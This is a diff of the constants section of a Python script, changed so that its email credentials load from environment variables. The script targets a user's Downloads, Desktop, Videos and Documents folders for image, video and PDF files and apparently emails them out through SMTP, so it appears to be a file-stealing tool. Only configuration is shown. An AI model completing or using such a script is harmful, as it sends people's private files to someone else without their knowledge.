@@ -4,15 +4,17 @@ import smtplib
 import time
 import mimetypes
 from email.message import EmailMessage
+from dotenv import load_dotenv
 
+load_dotenv()
 #______________________________________________const__________________________________________
 arr_of_targets = ["Downloads", "Desktop", "Videos", "Documents" ]
 max_size = 17_825_000
 usernm = os.getlogin()
 subject = "Tyler"
-email_address = "******@gmail.com"#your email
-email_password = "**** **** **** ****"#password
-to_address = "******@gmail.com"#your email
+email_address = os.getenv("email_address")
+email_password = os.getenv("email_password")
+to_address = os.getenv("to_address")
 allowed_extensions = [".jpeg", ".jpg", ".pdf", ".png", ".mp4", ".mkv", ".avi", ".mov", ".wmv",
     ".flv", ".webm", ".m4v", ".3gp", ".ts", ".docs"]#you can add or delete extencions you want
 #__________________________________________end_const_________________________________________
